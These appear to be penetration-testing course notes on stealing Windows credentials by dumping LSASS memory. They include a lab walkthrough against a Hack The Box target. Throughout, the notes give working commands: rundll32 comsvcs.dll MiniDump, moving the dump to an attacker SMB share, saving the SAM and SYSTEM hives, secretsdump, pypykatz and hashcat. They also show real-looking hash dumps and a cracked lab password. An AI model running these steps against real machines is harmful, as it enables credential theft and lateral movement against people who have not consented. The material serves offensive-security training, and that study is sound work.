# 12 — Attacking LSASS

## Overview

LSASS (`lsass.exe`) is responsible for enforcing security policies, handling user authentication, and **caching credentials in memory** for active logon sessions. Dumping LSASS memory lets us extract NT hashes, Kerberos tickets, DPAPI master keys, and potentially cleartext passwords (WDIGEST).

---

## Step 1 — Dump LSASS Process Memory

### Method A: Task Manager (GUI required)

1. Open Task Manager → **Processes** tab
2. Right-click **Local Security Authority Process**
3. Select **Create dump file**
4. File saved as `lsass.DMP` in `%temp%`

### Method B: Rundll32 + Comsvcs.dll (CLI, elevated)

**Find LSASS PID:**
```cmd
# From cmd
tasklist /svc | findstr lsass

# From PowerShell
Get-Process lsass
```

**Create dump file (replace PID):**
```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <LSASS-PID> C:\lsass.dmp full
```

> **Note:** Most modern AV tools will flag/block this. May require AV bypass.

---

## Step 2 — Transfer Dump to Attack Host

Use any file transfer method (SMB share, SCP, etc.):
```bash
# Attack host — start SMB share
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/user/loot/
```
```cmd
# Target — move dump to share
move C:\lsass.dmp \\<ATTACKER-IP>\CompData
```

---

## Step 3 — Extract Credentials with Pypykatz

**Pypykatz** = Python implementation of Mimikatz. Runs on Linux, works offline against dump files.

```bash
pypykatz lsa minidump /path/to/lsass.dmp
```

### Output Sections Explained

| Section | What It Contains | Notes |
|---------|-----------------|-------|
| **MSV** | Username, Domain, NT hash, SHA1 hash | Primary target — crack the NT hash |
| **WDIGEST** | Username, Domain, possibly cleartext password | Cleartext on XP–Win8 / Server 2003–2012. Disabled by default on modern OS |
| **Kerberos** | Username, Domain, tickets, ekeys, pins | Useful for lateral movement in AD environments |
| **DPAPI** | Master keys (`masterkey`, `sha1_masterkey`) | Can decrypt browser passwords, Credential Manager, etc. |

### Example MSV Output
```
== MSV ==
    Username: bob
    Domain: DESKTOP-33E7O54
    LM: NA
    NT: 64f12cddaa88057e06a81b54e73b949b
    SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
    DPAPI: NA
```

---

## Step 4 — Crack NT Hashes

```bash
hashcat -m 1000 <NT-hash> /usr/share/wordlists/rockyou.txt
```

---

## WDIGEST Details

| OS Range | WDIGEST Status | Cleartext Passwords? |
|----------|---------------|---------------------|
| XP – Windows 8 | Enabled by default | **Yes** |
| Server 2003 – Server 2012 | Enabled by default | **Yes** |
| Windows 8.1+ / Server 2012 R2+ | Disabled by default | No (unless re-enabled) |

> Microsoft released a security update (KB2871997) to address WDIGEST cleartext caching.

---

## Quick Reference — LSASS Dump Methods

| Method | Requirements | Stealth | Notes |
|--------|-------------|---------|-------|
| Task Manager | GUI + admin | Low | Easy but requires interactive session |
| rundll32 + comsvcs.dll | CLI + admin | Low | Flagged by most AV |
| Mimikatz `sekurlsa::logonpasswords` | On-target + admin | Very low | Runs directly, no dump file needed |
| `procdump.exe` (Sysinternals) | CLI + admin | Medium | Signed Microsoft binary, less suspicious |

---

## Attack Workflow Summary

```
1. Get admin access (local or remote)
2. Dump LSASS memory:
   - GUI: Task Manager → Create dump file
   - CLI: rundll32 comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
3. Transfer lsass.dmp to attack host
4. Parse with pypykatz: pypykatz lsa minidump lsass.dmp
5. Extract NT hashes from MSV sections
6. Crack with hashcat: hashcat -m 1000 <hash> rockyou.txt
7. Check WDIGEST for cleartext passwords (older systems)
8. Collect DPAPI master keys for further decryption
```

---

## Key Takeaways

- LSASS caches credentials for **all active logon sessions** — dump it to get everything in memory at that moment
- **Pypykatz** is the go-to Linux tool for parsing LSASS dump files offline
- **MSV** section has the NT hashes you want to crack
- **WDIGEST** may have cleartext passwords on older Windows (XP–Win8, Server 2003–2012)
- **DPAPI master keys** from LSASS can decrypt browser saved passwords, Credential Manager, etc.
- Modern AV will block most LSASS dump techniques — may need bypass methods
- Always prefer **offline** analysis (dump + transfer) over running tools directly on target
- `Get-Process lsass` or `tasklist /svc` to find PID before using rundll32 method
- Use `xfreerdp /drive:share,/tmp/loot` to map a local folder as `\\tsclient\share\` for easy file transfer

---

## Exercise Walkthrough — Target: 10.129.202.149

**Given creds:** `htb-student:HTB_@cademy_stdnt!` (local admin via RDP)  
**Machine:** FS01 (Windows 10 / Server 2019 Build 17763)

### Q1 — What executable is associated with LSASS?

**Answer:** `lsass.exe`

### Q2 — Get Vendor user's cleartext password

**Step 1 — RDP with drive redirection:**
```bash
xfreerdp /v:10.129.202.149 /u:htb-student /p:'HTB_@cademy_stdnt!' /drive:share,/tmp/loot /cert:ignore +clipboard
```
> This maps `/tmp/loot` on the attack host as `\\tsclient\share\` inside the RDP session.

**Step 2 — Save registry hives (admin PowerShell on target):**
```powershell
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
```

**Step 3 — Dump LSASS memory (admin PowerShell on target):**
```powershell
Get-Process lsass
# PID was 668
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 668 C:\lsass.dmp full
```

**Step 4 — Transfer files via drive redirection:**
```powershell
copy C:\sam.save \\tsclient\share\sam.save
copy C:\system.save \\tsclient\share\system.save
copy C:\lsass.dmp \\tsclient\share\lsass.dmp
```

**Step 5 — Dump hashes with secretsdump (attack host):**
```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam /tmp/loot/sam.save -system /tmp/loot/system.save LOCAL
```

**Output:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9e73cc8353847cfce7b5f88061103b43:::
Vendor:1003:aad3b435b51404eeaad3b435b51404ee:31f87811133bc6aaa75a536e77f64314:::
htb-student:1006:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::
```

**Step 6 — Crack Vendor's NT hash:**
```bash
echo '31f87811133bc6aaa75a536e77f64314' > /tmp/vendor.hash
hashcat -m 1000 /tmp/vendor.hash /usr/share/wordlists/rockyou.txt
```

**Result:** `31f87811133bc6aaa75a536e77f64314:Mic@123`

**Answer:** `Mic@123`

### Lessons Learned

- `htb-student` had local admin (could dump SAM/LSASS) but was **not Pwn3d over SMB** — remote dump tools (netexec, secretsdump) failed
- **xfreerdp `/drive:share`** is the go-to for file transfer when you only have RDP access and no VPN back-channel
- `\\tsclient\share\` is the UNC path to the redirected drive inside the RDP session
- SAM + SYSTEM hives were sufficient to get Vendor's hash — LSASS dump was also created but not needed for this question
